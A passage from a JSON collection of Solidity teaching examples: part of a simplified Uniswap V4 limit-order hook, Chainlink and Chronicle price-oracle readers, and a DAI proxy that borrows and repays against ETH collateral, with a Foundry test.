afterRemoveLiquidity: false,\n            beforeSwap: false,\n            afterSwap: true, // We need this!\n            beforeDonate: false,\n            afterDonate: false,\n            beforeSwapReturnDelta: false,\n            afterSwapReturnDelta: false,\n            afterAddLiquidityReturnDelta: false,\n            afterRemoveLiquidityReturnDelta: false\n        });\n    }\n\n    // Helper to compute pool ID\n    function toId(PoolKey memory key) internal pure returns (bytes32) {\n        return keccak256(abi.encode(key));\n    }\n\n    // Required hook interface functions (no-op for unused hooks)\n    function beforeInitialize(address, PoolKey calldata, uint160)\n        external pure override returns (bytes4) {\n        return IHooks.beforeInitialize.selector;\n    }\n    function afterInitialize(address, PoolKey calldata, uint160, int24)\n        external pure override returns (bytes4) {\n        return IHooks.afterInitialize.selector;\n    }\n    function beforeAddLiquidity(address, PoolKey calldata, IPoolManager.ModifyLiquidityParams calldata, bytes calldata)\n        external pure override returns (bytes4) {\n        return IHooks.beforeAddLiquidity.selector;\n    }\n    function afterAddLiquidity(address, PoolKey calldata, IPoolManager.ModifyLiquidityParams calldata, BalanceDelta, BalanceDelta, bytes calldata)\n        external pure override returns (bytes4, BalanceDelta) {\n        return (IHooks.afterAddLiquidity.selector, BalanceDelta.wrap(0));\n    }\n    function beforeRemoveLiquidity(address, PoolKey calldata, IPoolManager.ModifyLiquidityParams calldata, bytes calldata)\n        external pure override returns (bytes4) {\n        return IHooks.beforeRemoveLiquidity.selector;\n    }\n    function afterRemoveLiquidity(address, PoolKey calldata, IPoolManager.ModifyLiquidityParams calldata, BalanceDelta, BalanceDelta, bytes calldata)\n        external pure override returns (bytes4, BalanceDelta) {\n        return (IHooks.afterRemoveLiquidity.selector, BalanceDelta.wrap(0));\n    }\n    function beforeSwap(address, PoolKey calldata, IPoolManager.SwapParams calldata, bytes calldata)\n        external pure override returns (bytes4, BeforeSwapDelta, uint24) {\n        return (IHooks.beforeSwap.selector, BeforeSwapDelta.wrap(0), 0);\n    }\n    function beforeDonate(address, PoolKey calldata, uint256, uint256, bytes calldata)\n        external pure override returns (bytes4) {\n        return IHooks.beforeDonate.selector;\n    }\n    function afterDonate(address, PoolKey calldata, uint256, uint256, bytes calldata)\n        external pure override returns (bytes4) {\n        return IHooks.afterDonate.selector;\n    }\n\n    event LimitOrderFilled(\n        bytes32 indexed poolId,\n        int24 tick,\n        bool zeroForOne,\n        uint256 amount\n    );\n}\n\n// ============ Types & Interfaces ============\n\ntype Currency is address;\n\nlibrary CurrencyLibrary {\n    function unwrap(Currency currency) internal pure returns (address) {\n        return Currency.unwrap(currency);\n    }\n}\n\nusing CurrencyLibrary for Currency;\n\nstruct PoolKey {\n    Currency currency0;\n    Currency currency1;\n    uint24 fee;\n    int24 tickSpacing;\n    address hooks;\n}\n\ntype BalanceDelta is int256;\ntype BeforeSwapDelta is int256;\n\nlibrary Hooks {\n    struct Permissions {\n        bool beforeInitialize;\n        bool afterInitialize;\n        bool beforeAddLiquidity;\n        bool afterAddLiquidity;\n        bool beforeRemoveLiquidity;\n        bool afterRemoveLiquidity;\n        bool beforeSwap;\n        bool afterSwap;\n        bool beforeDonate;\n        bool afterDonate;\n        bool beforeSwapReturnDelta;\n        bool afterSwapReturnDelta;\n        bool afterAddLiquidityReturnDelta;\n        bool afterRemoveLiquidityReturnDelta;\n    }\n}\n\ninterface IPoolManager {\n    struct SwapParams {\n        bool zeroForOne;\n        int256 amountSpecified;\n        uint160 sqrtPriceLimitX96;\n    }\n\n    struct ModifyLiquidityParams {\n        int24 tickLower;\n        int24 tickUpper;\n        int256 liquidityDelta;\n        bytes32 salt;\n    }\n\n    function getSlot0(bytes32 poolId)\n        external\n        view\n        returns (uint160 sqrtPriceX96, int24 tick, uint24 protocolFee, uint24 lpFee);\n\n    function swap(PoolKey memory key, SwapParams memory params, bytes calldata hookData)\n        external\n        returns (BalanceDelta);\n}\n\ninterface IHooks {\n    function beforeInitialize(address sender, PoolKey calldata key, uint160 sqrtPriceX96)\n        external returns (bytes4);\n    function afterInitialize(address sender, PoolKey calldata key, uint160 sqrtPriceX96, int24 tick)\n        external returns (bytes4);\n    function beforeAddLiquidity(address sender, PoolKey calldata key, IPoolManager.ModifyLiquidityParams calldata params, bytes calldata hookData)\n        external returns (bytes4);\n    function afterAddLiquidity(address sender, PoolKey calldata key, IPoolManager.ModifyLiquidityParams calldata params, BalanceDelta delta, BalanceDelta feesAccrued, bytes calldata hookData)\n        external returns (bytes4, BalanceDelta);\n    function beforeRemoveLiquidity(address sender, PoolKey calldata key, IPoolManager.ModifyLiquidityParams calldata params, bytes calldata hookData)\n        external returns (bytes4);\n    function afterRemoveLiquidity(address sender, PoolKey calldata key, IPoolManager.ModifyLiquidityParams calldata params, BalanceDelta delta, BalanceDelta feesAccrued, bytes calldata hookData)\n        external returns (bytes4, BalanceDelta);\n    function beforeSwap(address sender, PoolKey calldata key, IPoolManager.SwapParams calldata params, bytes calldata hookData)\n        external returns (bytes4, BeforeSwapDelta, uint24);\n    function afterSwap(address sender, PoolKey calldata key, IPoolManager.SwapParams calldata params, BalanceDelta delta, bytes calldata hookData)\n        external returns (bytes4, int128);\n    function beforeDonate(address sender, PoolKey calldata key, uint256 amount0, uint256 amount1, bytes calldata hookData)\n        external returns (bytes4);\n    function afterDonate(address sender, PoolKey calldata key, uint256 amount0, uint256 amount1, bytes calldata hookData)\n        external returns (bytes4);\n}\n\ninterface IERC20 {\n    function transferFrom(address sender, address recipient, uint256 amount)\n        external returns (bool);\n    function transfer(address recipient, uint256 amount)\n        external returns (bool);\n}\n\n```",
    "codes": [
      {
        "fileName": "UniswapV4LimitOrder.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n/// @notice Simplified Uniswap V4 Limit Order Hook\n/// @dev Hooks allow custom logic to execute during swap lifecycle\n/// This example demonstrates a basic limit order mechanism using afterSwap\ncontract LimitOrderHook is IHooks {\n    IPoolManager public immutable poolManager;\n\n    // Mapping: poolId => tick => zeroForOne => total liquidity\n    mapping(bytes32 => mapping(int24 => mapping(bool => uint256))) public tickLiquidity;\n\n    // Mapping: poolId => tick => zeroForOne => user => liquidity\n    mapping(bytes32 => mapping(int24 => mapping(bool => mapping(address => uint256))))\n        public userPositions;\n\n    error NotPoolManager();\n    error InvalidTick();\n\n    constructor(IPoolManager _poolManager) {\n        poolManager = _poolManager;\n    }\n\n    /// @notice Place a limit order at a specific tick\n    /// @param key The pool to place the order in\n    /// @param tick The tick (price point) for the limit order\n    /// @param zeroForOne true = sell token0 for token1, false = sell token1 for token0\n    /// @param amount Amount of tokens to sell\n    function placeLimitOrder(\n        PoolKey calldata key,\n        int24 tick,\n        bool zeroForOne,\n        uint256 amount\n    ) external {\n        // Validate tick is on the correct side of current price\n        (, int24 currentTick,,) = poolManager.getSlot0(toId(key));\n\n        // For selling token0: tick must be above current (price goes up)\n        // For selling token1: tick must be below current (price goes down)\n        if (zeroForOne && tick <= currentTick) revert InvalidTick();\n        if (!zeroForOne && tick >= currentTick) revert InvalidTick();\n\n        bytes32 poolId = toId(key);\n\n        // Transfer tokens from user\n        Currency currency = zeroForOne ? key.currency0 : key.currency1;\n        IERC20(Currency.unwrap(currency)).transferFrom(\n            msg.sender,\n            address(this),\n            amount\n        );\n\n        // Record the position\n        tickLiquidity[poolId][tick][zeroForOne] += amount;\n        userPositions[poolId][tick][zeroForOne][msg.sender] += amount;\n    }\n\n    /// @notice Called by PoolManager after every swap\n    /// @dev Check if price crossed any limit order ticks and execute them\n    function afterSwap(\n        address,\n        PoolKey calldata key,\n        IPoolManager.SwapParams calldata params,\n        BalanceDelta,\n        bytes calldata\n    ) external override returns (bytes4, int128) {\n        if (msg.sender != address(poolManager)) revert NotPoolManager();\n\n        (, int24 currentTick,,) = poolManager.getSlot0(toId(key));\n        bytes32 poolId = toId(key);\n\n        // Check if any limit orders at this tick should be filled\n        // zeroForOne swaps move price down, so check sell-token1 orders\n        // !zeroForOne swaps move price up, so check sell-token0 orders\n        bool checkZeroForOne = !params.zeroForOne;\n\n        uint256 liquidity = tickLiquidity[poolId][currentTick][checkZeroForOne];\n\n        if (liquidity > 0) {\n            // Execute limit orders at this tick\n            _executeLimitOrders(key, currentTick, checkZeroForOne, liquidity);\n        }\n\n        return (IHooks.afterSwap.selector, 0);\n    }\n\n    /// @notice Execute limit orders at a specific tick\n    function _executeLimitOrders(\n        PoolKey calldata key,\n        int24 tick,\n        bool zeroForOne,\n        uint256 amount\n    ) internal {\n        // In a full implementation, this would:\n        // 1. Swap the tokens using poolManager.swap()\n        // 2. Distribute output tokens to limit order placers\n        // 3. Clear the filled positions\n\n        bytes32 poolId = toId(key);\n\n        // Clear the tick liquidity (orders are filled)\n        tickLiquidity[poolId][tick][zeroForOne] = 0;\n\n        // Emit event for off-chain tracking\n        emit LimitOrderFilled(poolId, tick, zeroForOne, amount);\n    }\n\n    /// @notice Users can cancel unfilled limit orders\n    function cancelLimitOrder(\n        PoolKey calldata key,\n        int24 tick,\n        bool zeroForOne\n    ) external {\n        bytes32 poolId = toId(key);\n        uint256 amount = userPositions[poolId][tick][zeroForOne][msg.sender];\n\n        require(amount > 0, \"No position\");\n\n        // Clear position\n        userPositions[poolId][tick][zeroForOne][msg.sender] = 0;\n        tickLiquidity[poolId][tick][zeroForOne] -= amount;\n\n        // Return tokens\n        Currency currency = zeroForOne ? key.currency0 : key.currency1;\n        IERC20(Currency.unwrap(currency)).transfer(msg.sender, amount);\n    }\n\n    /// @notice Return hook permissions - we only need afterSwap\n    function getHookPermissions() public pure returns (Hooks.Permissions memory) {\n        return Hooks.Permissions({\n            beforeInitialize: false,\n            afterInitialize: false,\n            beforeAddLiquidity: false,\n            afterAddLiquidity: false,\n            beforeRemoveLiquidity: false,\n            afterRemoveLiquidity: false,\n            beforeSwap: false,\n            afterSwap: true, // We need this!\n            beforeDonate: false,\n            afterDonate: false,\n            beforeSwapReturnDelta: false,\n            afterSwapReturnDelta: false,\n            afterAddLiquidityReturnDelta: false,\n            afterRemoveLiquidityReturnDelta: false\n        });\n    }\n\n    // Helper to compute pool ID\n    function toId(PoolKey memory key) internal pure returns (bytes32) {\n        return keccak256(abi.encode(key));\n    }\n\n    // Required hook interface functions (no-op for unused hooks)\n    function beforeInitialize(address, PoolKey calldata, uint160)\n        external pure override returns (bytes4) {\n        return IHooks.beforeInitialize.selector;\n    }\n    function afterInitialize(address, PoolKey calldata, uint160, int24)\n        external pure override returns (bytes4) {\n        return IHooks.afterInitialize.selector;\n    }\n    function beforeAddLiquidity(address, PoolKey calldata, IPoolManager.ModifyLiquidityParams calldata, bytes calldata)\n        external pure override returns (bytes4) {\n        return IHooks.beforeAddLiquidity.selector;\n    }\n    function afterAddLiquidity(address, PoolKey calldata, IPoolManager.ModifyLiquidityParams calldata, BalanceDelta, BalanceDelta, bytes calldata)\n        external pure override returns (bytes4, BalanceDelta) {\n        return (IHooks.afterAddLiquidity.selector, BalanceDelta.wrap(0));\n    }\n    function beforeRemoveLiquidity(address, PoolKey calldata, IPoolManager.ModifyLiquidityParams calldata, bytes calldata)\n        external pure override returns (bytes4) {\n        return IHooks.beforeRemoveLiquidity.selector;\n    }\n    function afterRemoveLiquidity(address, PoolKey calldata, IPoolManager.ModifyLiquidityParams calldata, BalanceDelta, BalanceDelta, bytes calldata)\n        external pure override returns (bytes4, BalanceDelta) {\n        return (IHooks.afterRemoveLiquidity.selector, BalanceDelta.wrap(0));\n    }\n    function beforeSwap(address, PoolKey calldata, IPoolManager.SwapParams calldata, bytes calldata)\n        external pure override returns (bytes4, BeforeSwapDelta, uint24) {\n        return (IHooks.beforeSwap.selector, BeforeSwapDelta.wrap(0), 0);\n    }\n    function beforeDonate(address, PoolKey calldata, uint256, uint256, bytes calldata)\n        external pure override returns (bytes4) {\n        return IHooks.beforeDonate.selector;\n    }\n    function afterDonate(address, PoolKey calldata, uint256, uint256, bytes calldata)\n        external pure override returns (bytes4) {\n        return IHooks.afterDonate.selector;\n    }\n\n    event LimitOrderFilled(\n        bytes32 indexed poolId,\n        int24 tick,\n        bool zeroForOne,\n        uint256 amount\n    );\n}\n\n// ============ Types & Interfaces ============\n\ntype Currency is address;\n\nlibrary CurrencyLibrary {\n    function unwrap(Currency currency) internal pure returns (address) {\n        return Currency.unwrap(currency);\n    }\n}\n\nusing CurrencyLibrary for Currency;\n\nstruct PoolKey {\n    Currency currency0;\n    Currency currency1;\n    uint24 fee;\n    int24 tickSpacing;\n    address hooks;\n}\n\ntype BalanceDelta is int256;\ntype BeforeSwapDelta is int256;\n\nlibrary Hooks {\n    struct Permissions {\n        bool beforeInitialize;\n        bool afterInitialize;\n        bool beforeAddLiquidity;\n        bool afterAddLiquidity;\n        bool beforeRemoveLiquidity;\n        bool afterRemoveLiquidity;\n        bool beforeSwap;\n        bool afterSwap;\n        bool beforeDonate;\n        bool afterDonate;\n        bool beforeSwapReturnDelta;\n        bool afterSwapReturnDelta;\n        bool afterAddLiquidityReturnDelta;\n        bool afterRemoveLiquidityReturnDelta;\n    }\n}\n\ninterface IPoolManager {\n    struct SwapParams {\n        bool zeroForOne;\n        int256 amountSpecified;\n        uint160 sqrtPriceLimitX96;\n    }\n\n    struct ModifyLiquidityParams {\n        int24 tickLower;\n        int24 tickUpper;\n        int256 liquidityDelta;\n        bytes32 salt;\n    }\n\n    function getSlot0(bytes32 poolId)\n        external\n        view\n        returns (uint160 sqrtPriceX96, int24 tick, uint24 protocolFee, uint24 lpFee);\n\n    function swap(PoolKey memory key, SwapParams memory params, bytes calldata hookData)\n        external\n        returns (BalanceDelta);\n}\n\ninterface IHooks {\n    function beforeInitialize(address sender, PoolKey calldata key, uint160 sqrtPriceX96)\n        external returns (bytes4);\n    function afterInitialize(address sender, PoolKey calldata key, uint160 sqrtPriceX96, int24 tick)\n        external returns (bytes4);\n    function beforeAddLiquidity(address sender, PoolKey calldata key, IPoolManager.ModifyLiquidityParams calldata params, bytes calldata hookData)\n        external returns (bytes4);\n    function afterAddLiquidity(address sender, PoolKey calldata key, IPoolManager.ModifyLiquidityParams calldata params, BalanceDelta delta, BalanceDelta feesAccrued, bytes calldata hookData)\n        external returns (bytes4, BalanceDelta);\n    function beforeRemoveLiquidity(address sender, PoolKey calldata key, IPoolManager.ModifyLiquidityParams calldata params, bytes calldata hookData)\n        external returns (bytes4);\n    function afterRemoveLiquidity(address sender, PoolKey calldata key, IPoolManager.ModifyLiquidityParams calldata params, BalanceDelta delta, BalanceDelta feesAccrued, bytes calldata hookData)\n        external returns (bytes4, BalanceDelta);\n    function beforeSwap(address sender, PoolKey calldata key, IPoolManager.SwapParams calldata params, bytes calldata hookData)\n        external returns (bytes4, BeforeSwapDelta, uint24);\n    function afterSwap(address sender, PoolKey calldata key, IPoolManager.SwapParams calldata params, BalanceDelta delta, bytes calldata hookData)\n        external returns (bytes4, int128);\n    function beforeDonate(address sender, PoolKey calldata key, uint256 amount0, uint256 amount1, bytes calldata hookData)\n        external returns (bytes4);\n    function afterDonate(address sender, PoolKey calldata key, uint256 amount0, uint256 amount1, bytes calldata hookData)\n        external returns (bytes4);\n}\n\ninterface IERC20 {\n    function transferFrom(address sender, address recipient, uint256 amount)\n        external returns (bool);\n    function transfer(address recipient, uint256 amount)\n        external returns (bool);\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "defi",
      "uniswap",
      "v4",
      "limit",
      "order",
      "hook",
      "amm"
    ],
    "order": 10
  },
  {
    "slug": "chainlink-price-oracle",
    "title": "Chainlink Price Oracle",
    "category": "DeFi",
    "categorySlug": "defi",
    "description": "Chainlink Price Oracle",
    "content": "### ETH / USD Price Oracle\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract ChainlinkPriceOracle {\n    AggregatorV3Interface internal priceFeed;\n\n    constructor() {\n        // ETH / USD\n        priceFeed =\n            AggregatorV3Interface(0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419);\n    }\n\n    function getLatestPrice() public view returns (int256) {\n        (\n            uint80 roundID,\n            int256 price,\n            uint256 startedAt,\n            uint256 timeStamp,\n            uint80 answeredInRound\n        ) = priceFeed.latestRoundData();\n        // for ETH / USD price is scaled up by 10 ** 8\n        return price / 1e8;\n    }\n}\n\ninterface AggregatorV3Interface {\n    function latestRoundData()\n        external\n        view\n        returns (\n            uint80 roundId,\n            int256 answer,\n            uint256 startedAt,\n            uint256 updatedAt,\n            uint80 answeredInRound\n        );\n}\n\n```",
    "codes": [
      {
        "fileName": "Chainlink.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract ChainlinkPriceOracle {\n    AggregatorV3Interface internal priceFeed;\n\n    constructor() {\n        // ETH / USD\n        priceFeed =\n            AggregatorV3Interface(0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419);\n    }\n\n    function getLatestPrice() public view returns (int256) {\n        (\n            uint80 roundID,\n            int256 price,\n            uint256 startedAt,\n            uint256 timeStamp,\n            uint80 answeredInRound\n        ) = priceFeed.latestRoundData();\n        // for ETH / USD price is scaled up by 10 ** 8\n        return price / 1e8;\n    }\n}\n\ninterface AggregatorV3Interface {\n    function latestRoundData()\n        external\n        view\n        returns (\n            uint80 roundId,\n            int256 answer,\n            uint256 startedAt,\n            uint256 updatedAt,\n            uint80 answeredInRound\n        );\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "defi",
      "chainlink",
      "price",
      "oracle",
      "oracles"
    ],
    "order": 11
  },
  {
    "slug": "chronicle-price-oracle",
    "title": "Chronicle Price Oracle",
    "category": "DeFi",
    "categorySlug": "defi",
    "description": "Chronicle Price Oracle",
    "content": "### ETH / USD Price Oracle\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.16;\n\n/**\n * @title OracleReader\n * @notice A simple contract to read from Chronicle oracles\n * @dev To see the full repository, visit https://github.com/chronicleprotocol/OracleReader-Example.\n * @dev Addresses in this contract are hardcoded for the Sepolia testnet.\n * For other supported networks, check the https://chroniclelabs.org/dashboard/oracles.\n */\ncontract OracleReader {\n    /**\n    * @notice The Chronicle oracle to read from.\n    * Chronicle_ETH_USD_3:0xdd6D76262Fd7BdDe428dcfCd94386EbAe0151603\n    * Network: Sepolia\n    */\n\n    IChronicle public chronicle = IChronicle(address(0xdd6D76262Fd7BdDe428dcfCd94386EbAe0151603));\n\n    /** \n    * @notice The SelfKisser granting access to Chronicle oracles.\n    * SelfKisser_1:0x0Dcc19657007713483A5cA76e6A7bbe5f56EA37d\n    * Network: Sepolia\n    * For a full list of SelfKisser addresses on different Testnet networks\n    * please check here https://docs.chroniclelabs.org/Developers/tutorials/Remix\n    */\n    ISelfKisser public selfKisser = ISelfKisser(address(0x0Dcc19657007713483A5cA76e6A7bbe5f56EA37d));\n\n    constructor() {\n        // Note to add address(this) to chronicle oracle's whitelist.\n        // This allows the contract to read from the chronicle oracle.\n        selfKisser.selfKiss(address(chronicle));\n    }\n\n    /** \n    * @notice Function to read the latest data from the Chronicle oracle.\n    * @return val The current value returned by the oracle.\n    * @return age The timestamp of the last update from the oracle.\n    */\n    function read() external view returns (uint256 val, uint256 age) {\n        (val, age) = chronicle.readWithAge();\n    }\n}\n\n// Copied from [chronicle-std](https://github.com/chronicleprotocol/chronicle-std/blob/main/src/IChronicle.sol).\ninterface IChronicle {\n    /** \n    * @notice Returns the oracle's current value.\n    * @dev Reverts if no value set.\n    * @return value The oracle's current value.\n    */\n    function read() external view returns (uint256 value);\n\n    /** \n    * @notice Returns the oracle's current value and its age.\n    * @dev Reverts if no value set.\n    * @return value The oracle's current value using 18 decimals places.\n    * @return age The value's age as a Unix Timestamp .\n    * */\n    function readWithAge() external view returns (uint256 value, uint256 age);\n}\n\n// Copied from [self-kisser](https://github.com/chronicleprotocol/self-kisser/blob/main/src/ISelfKisser.sol).\ninterface ISelfKisser {\n    /// @notice Kisses caller on address.\n    function selfKiss(address oracle) external;\n}\n```",
    "codes": [
      {
        "fileName": "chroniclePriceOracle.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.16;\n\n/**\n * @title OracleReader\n * @notice A simple contract to read from Chronicle oracles\n * @dev To see the full repository, visit https://github.com/chronicleprotocol/OracleReader-Example.\n * @dev Addresses in this contract are hardcoded for the Sepolia testnet.\n * For other supported networks, check the https://chroniclelabs.org/dashboard/oracles.\n */\ncontract OracleReader {\n    /**\n    * @notice The Chronicle oracle to read from.\n    * Chronicle_ETH_USD_3:0xdd6D76262Fd7BdDe428dcfCd94386EbAe0151603\n    * Network: Sepolia\n    */\n\n    IChronicle public chronicle = IChronicle(address(0xdd6D76262Fd7BdDe428dcfCd94386EbAe0151603));\n\n    /** \n    * @notice The SelfKisser granting access to Chronicle oracles.\n    * SelfKisser_1:0x0Dcc19657007713483A5cA76e6A7bbe5f56EA37d\n    * Network: Sepolia\n    * For a full list of SelfKisser addresses on different Testnet networks\n    * please check here https://docs.chroniclelabs.org/Developers/tutorials/Remix\n    */\n    ISelfKisser public selfKisser = ISelfKisser(address(0x0Dcc19657007713483A5cA76e6A7bbe5f56EA37d));\n\n    constructor() {\n        // Note to add address(this) to chronicle oracle's whitelist.\n        // This allows the contract to read from the chronicle oracle.\n        selfKisser.selfKiss(address(chronicle));\n    }\n\n    /** \n    * @notice Function to read the latest data from the Chronicle oracle.\n    * @return val The current value returned by the oracle.\n    * @return age The timestamp of the last update from the oracle.\n    */\n    function read() external view returns (uint256 val, uint256 age) {\n        (val, age) = chronicle.readWithAge();\n    }\n}\n\n// Copied from [chronicle-std](https://github.com/chronicleprotocol/chronicle-std/blob/main/src/IChronicle.sol).\ninterface IChronicle {\n    /** \n    * @notice Returns the oracle's current value.\n    * @dev Reverts if no value set.\n    * @return value The oracle's current value.\n    */\n    function read() external view returns (uint256 value);\n\n    /** \n    * @notice Returns the oracle's current value and its age.\n    * @dev Reverts if no value set.\n    * @return value The oracle's current value using 18 decimals places.\n    * @return age The value's age as a Unix Timestamp .\n    * */\n    function readWithAge() external view returns (uint256 value, uint256 age);\n}\n\n// Copied from [self-kisser](https://github.com/chronicleprotocol/self-kisser/blob/main/src/ISelfKisser.sol).\ninterface ISelfKisser {\n    /// @notice Kisses caller on address.\n    function selfKiss(address oracle) external;\n}"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "defi",
      "chronicle",
      "price",
      "oracle",
      "oracles"
    ],
    "order": 12
  },
  {
    "slug": "dai-proxy",
    "title": "DAI Proxy Examples",
    "category": "DeFi",
    "categorySlug": "defi",
    "description": "Borrow and repay DAI using DssProxy",
    "content": "### Example\n\nExample of locking ETH collateral, borrowing DAI, repaying DAI and unlocking ETH using `DssProxy`.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\naddress constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;\naddress constant PROXY_REGISTRY = 0x4678f0a6958e4D2Bc4F1BAF7Bc52E8F3564f3fE4;\naddress constant PROXY_ACTIONS = 0x82ecD135Dce65Fbc6DbdD0e4237E0AF93FFD5038;\naddress constant CDP_MANAGER = 0x5ef30b9986345249bc32d8928B7ee64DE9435E39;\naddress constant JUG = 0x19c0976f590D67707E62397C87829d896Dc0f1F1;\naddress constant JOIN_ETH_C = 0xF04a5cC80B1E94C69B48f5ee68a08CD2F09A7c3E;\naddress constant JOIN_DAI = 0x9759A6Ac90977b93B58547b4A71c78317f391A28;\n\nbytes32 constant ETH_C =\n    0x4554482d43000000000000000000000000000000000000000000000000000000;\n\ncontract DaiProxy {\n    IERC20 private constant dai = IERC20(DAI);\n    address public immutable proxy;\n    uint256 public immutable cdpId;\n\n    constructor() {\n        proxy = IDssProxyRegistry(PROXY_REGISTRY).build();\n        bytes32 res = IDssProxy(proxy).execute(\n            PROXY_ACTIONS,\n            abi.encodeCall(IDssProxyActions.open, (CDP_MANAGER, ETH_C, proxy))\n        );\n        cdpId = uint256(res);\n    }\n\n    receive() external payable {}\n\n    function lockEth() external payable {\n        IDssProxy(proxy).execute{value: msg.value}(\n            PROXY_ACTIONS,\n            abi.encodeCall(\n                IDssProxyActions.lockETH, (CDP_MANAGER, JOIN_ETH_C, cdpId)\n            )\n        );\n    }\n\n    function borrow(uint256 daiAmount) external {\n        IDssProxy(proxy).execute(\n            PROXY_ACTIONS,\n            abi.encodeCall(\n                IDssProxyActions.draw,\n                (CDP_MANAGER, JUG, JOIN_DAI, cdpId, daiAmount)\n            )\n        );\n    }\n\n    function repay(uint256 daiAmount) external {\n        dai.approve(proxy, daiAmount);\n        IDssProxy(proxy).execute(\n            PROXY_ACTIONS,\n            abi.encodeCall(\n                IDssProxyActions.wipe, (CDP_MANAGER, JOIN_DAI, cdpId, daiAmount)\n            )\n        );\n    }\n\n    function repayAll() external {\n        dai.approve(proxy, type(uint256).max);\n        IDssProxy(proxy).execute(\n            PROXY_ACTIONS,\n            abi.encodeCall(\n                IDssProxyActions.wipeAll, (CDP_MANAGER, JOIN_DAI, cdpId)\n            )\n        );\n    }\n\n    function unlockEth(uint256 ethAmount) external {\n        IDssProxy(proxy).execute(\n            PROXY_ACTIONS,\n            abi.encodeCall(\n                IDssProxyActions.freeETH,\n                (CDP_MANAGER, JOIN_ETH_C, cdpId, ethAmount)\n            )\n        );\n    }\n}\n\ninterface IDssProxyRegistry {\n    function build() external returns (address proxy);\n}\n\ninterface IDssProxy {\n    function execute(address target, bytes memory data)\n        external\n        payable\n        returns (bytes32 res);\n}\n\ninterface IDssProxyActions {\n    function open(address cdpManager, bytes32 ilk, address usr)\n        external\n        returns (uint256 cdpId);\n    function lockETH(address cdpManager, address ethJoin, uint256 cdpId)\n        external\n        payable;\n    function draw(\n        address cdpManager,\n        address jug,\n        address daiJoin,\n        uint256 cdpId,\n        uint256 daiAmount\n    ) external;\n    function wipe(\n        address cdpManager,\n        address daiJoin,\n        uint256 cdpId,\n        uint256 daiAmount\n    ) external;\n    function wipeAll(address cdpManager, address daiJoin, uint256 cdpId)\n        external;\n    function freeETH(\n        address cdpManager,\n        address ethJoin,\n        uint256 cdpId,\n        uint256 collateralAmount\n    ) external;\n}\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function allowance(address owner, address spender)\n        external\n        view\n        returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transfer(address dst, uint256 amount) external returns (bool);\n    function transferFrom(address src, address dst, uint256 amount)\n        external\n        returns (bool);\n}\n\n```\n\n### Test\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.26;\n\nimport {Test, console2} from \"forge-std/Test.sol\";\nimport \"../../../src/defi/dai-proxy/DaiProxy.sol\";\n\naddress constant VAT = 0x35D1b3F3D7966A1DFe207aa4514C12a259A0492B;\n\nuint256 constant WAD = 1e18;\nuint256 constant RAY = 1e27;\nuint256 constant RAD = 1e45;\n\nuint256 constant ETH_AMOUNT = 100 * 1e18;\nuint256 constant DAI_AMOUNT = 10000 * 1e18;\n\ncontract DaiProxyTest is Test {\n    IERC20 private constant dai = IERC20(DAI);\n    ICdpManager private constant cdpManager = ICdpManager(CDP_MANAGER);\n    IVat private constant vat = IVat(VAT);\n    DaiProxy private proxy;\n\n    function setUp() public {\n        proxy = new DaiProxy();\n\n        // Check min borrow\n        IVat.Ilk memory ilk = vat.ilks(ETH_C);\n        assertGe(DAI_AMOUNT * RAY, ilk.dust, \"DAI borrow amount < dust\");\n\n        // Interest rate accumulator\n        console2.log(\"ilk.rate\", ilk.rate);\n    }\n\n    function print(address urnAddr) private {\n        IVat.Urn memory urn = vat.urns(ETH_C, urnAddr);\n        console2.log(\"--------------------\");\n        console2.log(\"vault collateral [wad]\", urn.ink);\n        console2.log(\"vault debt       [wad]\", urn.art);\n        console2.log(\"DAI in proxy     [wad]\", dai.balanceOf(address(proxy)));\n        console2.log(\"ETH in proxy     [wad]\", address(proxy).balance);\n    }\n\n    function test_proxy() public {\n        uint256 cdpId = proxy.cdpId();\n        address urnAddr = cdpManager.urns(cdpId);\n\n        console2.log(\"Before lock ETH\");\n        print(urnAddr);\n\n        proxy.lockEth{value: ETH_AMOUNT}();\n        console2.log(\"\");\n        console2.log(\"After lock ETH\");\n        print(urnAddr);\n\n        proxy.borrow(DAI_AMOUNT);\n        console2.log(\"\");\n        console2.log(\"After borrow DAI\");\n        print(urnAddr);\n\n        proxy.repay(DAI_AMOUNT / 2);\n        console2.log(\"\");\n        console2.log(\"After partial repay DAI\");\n        print(urnAddr);\n\n        proxy.repayAll();\n        console2.log(\"\");\n        console2.log(\"After repay all DAI\");\n        print(urnAddr);\n\n        proxy.unlockEth(ETH_AMOUNT);\n        console2.log(\"\");\n        console2.log(\"After unlock ETH\");\n        print(urnAddr);\n    }\n}\n\ninterface IVat {\n    // Collateral type\n    struct Ilk {\n        uint256 Art; // Total normalized debt      [wad]\n        uint256 rate; // Accumulated rates         [ray]\n        uint256 spot; // Price with safety margin  [ray]\n        uint256 line; // Debt ceiling              [rad]\n        uint256 dust; // Urn debt floor            [rad]\n    }\n\n    // Vault\n    struct Urn {\n        uint256 ink; // Locked collateral  [wad]\n        uint256 art; // Normalised debt    [wad]\n    }\n\n    function ilks(bytes32 ilk) external view returns (Ilk memory);\n    function urns(bytes32 ilk, address user)\n        external\n        view\n        returns (Urn memory);\n}\n\ninterface ICdpManager {\n    function urns(uint256 cdpId) external view returns (address urn);\n}\n\n```",
    "codes": [
      {
        "fileName": "DaiProxy.sol",
